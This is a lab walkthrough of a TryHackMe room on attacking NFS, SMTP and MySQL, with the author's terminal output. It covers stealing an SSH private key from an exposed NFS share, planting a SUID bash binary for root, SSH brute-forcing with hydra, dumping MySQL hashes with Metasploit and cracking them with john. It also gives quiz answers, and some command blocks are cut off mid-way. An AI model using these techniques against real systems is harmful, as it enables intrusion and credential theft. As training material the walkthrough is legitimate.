Task 1 - Get Connected
------------------------------------

Hello and welcome!

This room is a sequel to the first network services room. Similarly, it will explore a few more common Network Service vulnerabilities and misconfigurations that you're likely to find in CTFs, and some penetration test scenarios.

I would encourage you to complete the first network services room ([https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices)) before attempting this one.

As with the previous room, it is definitely worth having a basic knowledge of Linux before attempting this room. If you think you'll need some help with this, try completing the 'Linux Fundamentals' module ([https://tryhackme.com/module/linux-fundamentals](https://tryhackme.com/module/linux-fundamentals))

Before we get started:  

1.  Connect to the TryHackMe OpenVPN Server (See [https://tryhackme.com/access](https://tryhackme.com/access) for help!)
2.  Make sure you're sitting comfortably, and have a cup of Tea, Coffee or Water close!

Lets get started!

**N.B.** This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 ([https://tryhackme.com/room/wifihacking101](https://tryhackme.com/room/wifihacking101))

Task 2 - Understanding NFS
-------------------------------------------

**What is NFS?**

NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

**How does NFS work?**

We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: [https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

-    The file handle
-    The name of the file to be accessed
-    The user's, user ID
-    The user's group ID  
    

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.  

**What runs NFS?**

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

**More Information:**

Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.

Task 3 - Enumerating NFS
----------------------------------------

**Let's Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware - this can take up to five minutes so be patient!

**What is Enumeration?**

Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - [Infosec Institute](https://resources.infosecinstitute.com/what-is-enumeration/). It is a critical phase when considering how to enumerate and exploit a remote machine - as the information you will use to inform your attacks will come from this stage

**Requirements**

In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: **nfs-common**.

**NFS-Common**

It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: **l****ockd, statd**, **showmount**, **nfsstat,** **gssd**, **idmapd** and **mount.nfs**. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: [https://packages.ubuntu.com/jammy/nfs-common](https://packages.ubuntu.com/jammy/nfs-common).

You can install **nfs-common** using "_sudo apt install nfs-common_", it is part of the default repositories for most Linux distributions such as the Kali Remote Machine or AttackBox that is provided to TryHackMe.

**Port Scanning**

Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about **nmap** in more detail please have a look at the [nmap](https://tryhackme.com/room/furthernmap) room.

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using **nmap** with the **-A** and **-p-** tags.

**Mounting NFS shares**

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create  
this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

**sudo mount -t nfs IP:share /tmp/mount/ -nolock**

Let's break this down

| Tag      | Function                                                                    |
| -------- | --------------------------------------------------------------------------- |
| sudo     | Run as root                                                                 |
| mount    | Execute the mount command                                                   |
| -t nfs   | Type of device to mount, then specifying that it's NFS                      |
| IP:share | The IP Address of the NFS Server, and he name of the share we wish to mount |
| -nolock  | Specifies not to use NLM locking                                                                            |

Now we understand our tools, let's get started!

__Questions__

Conduct a **thorough** port scan scan of your choosing, how many ports are open?

A normal scan of the 1st 1000 ports shows only 3 ports open. This is incorrect answer. The text said a 'thorough'  scan. For some reason NMAP still hasn't returned after almost 2 hours of waiting. I've already exploited this box and coming back to this.  I don't see the need for this kind of question on a practice which has nothing to do with  NFS. It's a good habbit I guess to be thorough...
```bash
root@ip-10-10-230-40:~# nmap -sV -sS 10.10.13.245

Starting Nmap 7.60 ( https://nmap.org ) at 2023-04-23 00:47 BST

Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```
 but.. if you are like me and can find the service and hack it faster than you can scan it and just want the answer another way to get at it is once you have root you can run this on the box:
```bash
bash-4.4# netstat -ant |grep '0.0.0.0' 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:40415           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:55179           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:53229           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:54607           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
```
Ususally you can just grep for 'LISTEN' to show what ports are listening, but to make it easier for you to see the ports listening to the eth0 interface I use `0.0.0.0`. There is a total of 7 of those.

As an aside, in real situations, you may never have the luxury of a good nmap scan unless you are in a hurry and want to get found out/stopped in your tracks.
Answer: _7_

Which port contains the service we're looking to enumerate?
Answer: _2049_

Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
```bash
root@ip-10-10-230-40:~# showmount -e 10.10.13.245
Export list for 10.10.13.245:
/home *
```
Answer: _/home_

  
Time to mount the share to our local machine!

First, use "_mkdir /tmp/mount_" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
```bash
root@ip-10-10-230-40:~# sudo mount -t nfs 10.10.13.245:/home /tmp/mount/ -nolockroot@ip-10-10-230-40:~# mount 
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs 

[ .. ]

10.10.13.245:/home on /tmp/mount type nfs4 (rw,relatime,vers=4.2,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.10.230.40,local_lock=none,addr=10.10.13.245)
root@ip-10-10-230-40:~# cd /tmp/mount/
root@ip-10-10-230-40:/tmp/mount# ls
cappucino

```
Answer: _cappucino_

  
Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...
Answer: _None Needed_

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde**rs** could cont**a**in keys that would give us remote access to the server?
Answer: _.ssh_

Which of these keys is most useful to us?
**HINT:** What is the default name of an SSH identity file?
Answer: _id_rsa_

Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".

Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.

Can we log into the machine using _ssh -i key-file username@ip_ ? (Y/N)
```bash
root@ip-10-10-230-40:/tmp/mount/cappucino# cd .ssh
root@ip-10-10-230-40:/tmp/mount/cappucino/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@ip-10-10-230-40:/tmp/mount/cappucino/.ssh# cp id_rsa ~
root@ip-10-10-230-40:/tmp/mount/cappucino/.ssh# cd
root@ip-10-10-230-40:~# ls
Desktop    id_rsa        Pictures  Rooms    thinclient_drives
Downloads  Instructions  Postman   Scripts  Tools
root@ip-10-10-230-40:~# chmod 600 id_rsa
```

To see the userid, you can check the name in the pubic key. It's not required to have it in there but most people leave it in. It is there:
```bash
root@ip-10-10-230-40:~# cp /tmp/mount/cappucino/.ssh/id_rsa.pub .
root@ip-10-10-230-40:~# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTck1wS7orcud8ViGJKNYxrgrFPhDgpOH243FBoEFgfCdzv7WcWXgUgI+GPPyQsebPzbrAMZT/HjpEmejuXWfRjjLlVM5f+hoalN2aZt9TAZi84+7cWP3as+iq79FwUE1uuep+l9qN6KeQzC1w4sE6lJqTXc/ySbonAHMQu8rDZrYYvg1IzOyRVbo81MqIKDA6YUlPhY6K+SSBcCe5Hg9e39NKQCCk3coMJHVrXEOGQ7z7PES+kM/zWufY8PjSWZ96H/IbrAn2xWWqbWD0hujMcAFpM+HHV3xEOfQLPqBW+w21LqHKoFBrNS047Gt4e6fNGlpuneQBZ/8CjrZ9NH2H cappucino@polonfs
root@ip-10-10-230-40:~# 
```

Now we can try to login now that we have all of the details and have changed the private key perms to 600:
```bash
root@ip-10-10-230-40:~# ssh -i id_rsa cappucino@10.10.13.245

Task 4 - Exploiting NFS
------------------------------------

**We're done, right?**  

Not quite, if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

**What is root_squash?**

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

**SUID**

So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

**Method**

This sounds complicated, but really- provided you're familiar with how SUID files work, it's fairly easy to understand. We're able to upload files to the NFS share, and control the permissions of these files. We can set the permissions of whatever we upload, in this case a bash shell executable. We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

**The Executable**

Due to compatibility reasons, we'll use a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. You can download it [here](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). If you want to download it via the command line, be careful not to download the github page instead of the raw script. You can use `wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`.  

**Mapped Out Pathway:**

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:

  
    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS

Lets do this!

__Questions__

  
First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

Answer: _None Needed_

Download the bash executable to your Downloads directory. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
```bash
root@ip-10-10-230-40:~# wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

Now we need to check/change the file perms of the downloaded binary. It should be owned by the root user. Then copy the file we downloaded to the NFS share:
```bash
root@ip-10-10-230-40:/tmp/mount/cappucino# ls -al bash
-rw-r--r-- 1 root root 1113504 Apr 23 01:19 bash

root@ip-10-10-230-40:~# cp bash /tmp/mount/cappucino/.
```
Answer: _None Needed_

Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
Answer: _s_

Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.
```bash

root@ip-10-10-230-40:/tmp/mount/cappucino# ls -al bash
-rwsr-sr-x 1 root root 1113504 Apr 23 01:19 bash
```
Answer: _-rwsr-sr-x_

Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "_./bash -p_". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

SSH Back into the Victim from your Attackbox:

Task 5 - Understanding SMTP
---------------------------------------------

**What is SMTP?**

SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

The SMTP server performs three basic functions:

-    It verifies who is sending emails through the SMTP server.
-    It sends the outgoing mail
-    If the outgoing mail can't be delivered it sends the message back to the sender

Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.

**POP and IMAP**

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.  

**How does SMTP work?**

Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.

We can map the journey of an email from your computer to the recipient’s like this:

![[networkservices2-1.png]]

1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.  

2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.  

3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.

4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.  

5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.  

6. The E-Mail will then show up in the recipient's inbox.

This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:

**What runs SMTP?**

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

Task 6 - Enumerating SMTP
-------------------------------------------

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumerating Server Details**

Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the "_smtp_version_" module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.

**Enumerating Users from SMTP**

The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users

We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "_smtp_enum_" that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.

**Requirements**

As we're going to be using Metasploit for this, it's important that you have Metasploit installed. It is by default on both Kali Linux and Parrot OS; however, it's always worth doing a quick update to make sure that you're on the latest version before launching any attacks. You can do this with a simple "sudo apt update", and accompanying upgrade- if any are required.

**Alternatives**

It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.

This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.  

Now we've covered the theory. Let's get going!

__Questions:__

First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
```bash
root@ip-10-10-206-13:~# nmap -sV -sS 10.10.60.60

Starting Nmap 7.60 ( https://nmap.org ) at 2023-04-24 00:35 BST

Answer: _administrator_

Task 7 - Exploit SMTP
---------------------------------

**What do we know?**

Okay, at the end of our Enumeration section we have a few vital pieces of information:

1. A user account name  

2. The type of SMTP server and Operating System running.

We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and **bruteforce** the password of the SSH login for our user using Hydra.

**Preparation**

It's advisable that you exit Metasploit to continue the exploitation of this section of the room. Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation.  

**Hydra**

There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub [here](https://github.com/vanhauser-thc/thc-hydra).

Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the "_/usr/share/wordlists_" directory- if you'd like to browse and find a different wordlists to the widely used "rockyou.txt". Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration  

The syntax for the command we're going to use to find the passwords is this:

**"hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.60.60 ssh"**

Let's break it down:

| SECTION               | FUNCTION                                                                             |
| --------------------- | ------------------------------------------------------------------------------------ |
| hydra                 | Runs the hydra tool                                                                  |
| -t 16                 | Number of parallel connections to target                                             |
| -l user               | Points to the user who's account you're trying to compromise                         |
| -P path to dictionary | Points to the file containing the list of possible passwords                         |
| -vV                   | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| machine IP            | The IP address of the target machine                                                 |
| ssh / protocol        | Sets the protocol                                                                                     |

Looks like we're ready to _rock_ n roll!

Task 8 -Understanding MySQL
------------------------------------------------

**What is MySQL?**

In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:

**Database:**

A database is simply a persistent, organised collection of structured data

**RDBMS:**

A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.  

**SQL:**

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).  

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.  

**How does MySQL work?**

  
MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:  

1.  MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2.  Clients make requests by making specific statements in SQL.
3.  The server will respond to the client with whatever information has been requested.  
    

**What runs MySQL?**

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the LAMP stack, which includes: Linux, Apache, MySQL, and PHP.

**More Information:**

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 

[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)

__Questions:__

What type of software is MySQL?
Answer: _relational database management system_

What language is MySQL based on?
Answer: _SQL_

What communication model does MySQL use?
Answer: _client-server_

What is a common application of MySQL?
Answer: _Back End Database_

What major social network uses MySQL as their back-end database? This will require further research.
**HINT:** Who was involved in the Cambridge Analytica scandal?
Answer: _Facebook_

Task 9 - Enumerating MySQL
---------------------------------------------

**Let's Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, as this can take up to five minutes, so be patient!

**When you would begin attacking MySQL**

MySQL is likely not going to be the first point of call when getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information; however, in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

**The Scenario**  

Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **credentials: "root:password"** while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

**Requirements**

You will want to have MySQL installed on your system to connect to the remote MySQL server. In case this isn't already installed, you can install it using `sudo apt install default-mysql-client`. Don't worry- this won't install the server package on your system- just the client.  

Again, we're going to be using Metasploit for this; it's important that you have Metasploit installed, as it is by default on both Kali Linux and Parrot OS.

**Alternatives**

As with the previous task, it's worth noting that everything we will be doing using Metasploit can also be done either manually or with a set of non-Metasploit tools such as nmap's mysql-enum script: [https://nmap.org/nsedoc/scripts/mysql-enum.html](https://nmap.org/nsedoc/scripts/mysql-enum.html) or [https://www.exploit-db.com/exploits/23081](https://www.exploit-db.com/exploits/23081). I recommend that after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

Okay, enough talk. Let's get going!

__Questions:__

As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
```bash
root@ip-10-10-38-133:~# export VICTIM='10.10.113.223'
root@ip-10-10-38-133:~# echo $VICTIM
10.10.113.223
root@ip-10-10-38-133:~# nmap -sV -sS $VICTIM

Starting Nmap 7.60 ( https://nmap.org ) at 2023-04-25 00:21 BST
Nmap scan report for ip-10-10-113-223.eu-west-1.compute.internal (10.10.113.223)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.67 seconds
```
Answer: _3306_

Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "_mysql -h [IP] -u [username] -p_"
Answer: _None Needed_

Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
Answer: _None Needed_

We're going to be using the "mysql_sql" module.

Search for, select and list the options it needs. What three options do we need to set? (in descending order).
**HINT:** Each option name is separated by a /
Answer: _PASSWORD/RHOSTS/USERNAME_

Run the exploit. By default it will test with the "select version()" command, what result does this give you?
**NOTE:** This is in the output from nmap if you enumerate versions like I did.
Answer: _5.7.29-0ubuntu0.18.04.1_

Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
```bash
root@ip-10-10-38-133:~# msfconsole -q
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
msf6 > 
```

Check out all the available modules for MySQL:
```bash
msf6 > search mysql

Task 10 - Exploiting MySQL
-----------------------------------------

**What do we know?**

Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:  

1. MySQL server credentials  

2. The version of MySQL running

3. The number of Databases, and their names.

**Key Terminology**

In order to understand the exploits we're going to use next- we need to understand a few key terms.

**Schema:**

> In MySQL, physically, a _schema_ is synonymous with a _database_. You can substitute the keyword "SCHEMA" instead of DATABASE in MySQL SQL syntax, for example using CREATE SCHEMA instead of CREATE DATABASE. It's important to understand this relationship because some other database products draw a distinction. For example, in the Oracle Database product, a _schema_ represents only a part of a database: the tables and other objects owned by a single user.

**Hashes:**  

Hashes are, very simply, the product of a cryptographic algorithm to turn a variable length input into a fixed length output.

In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data. This creates an index that is significantly smaller than the original data, allowing the values to be searched and accessed more efficiently

However, the data we're going to be extracting are password hashes which are simply a way of storing passwords not in plaintext format.

Lets get cracking.

__Questions:__

Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?
```bash
msf6 auxiliary(scanner/mysql/mysql_schemadump) > back
msf6 > search mysql_hashdump

Answer: _Carl_

Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt".

What is the user/hash combination string?
**HINT:** Remember to input the whole hash string, like: carl:*(HASHDATA)*
Answer: _carl:*EA031893AA21444B170FC2162A56978B8CEECE18_

Now, we need to crack the password! Let's try John the Ripper against it using: "_john hash.txt_" what is the password of the user we found?
```bash
root@ip-10-10-38-133:~# vi hash.txt

root@ip-10-10-38-133:~# cat hash.txt
carl:*EA031893AA21444B170FC2162A56978B8CEECE18
root@ip-10-10-38-133:~#

root@ip-10-10-38-133:~# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])

Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Answer: _doggie_

**NOTE:** Depending on what you are cracking, you will have to set the format (--format=XXXX) appropriately. For MySQL 5.x it's 'mysql-sha1'.

Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?  
```bash
root@ip-10-10-38-133:~# ssh carl@$VICTIM
The authenticity of host '10.10.113.223 (10.10.113.223)' can't be established.

Are you sure you want to continue connecting (yes/no)? yes

Moral of the story, don't use the same passwords for every service :P Let's enumerate for the flag.
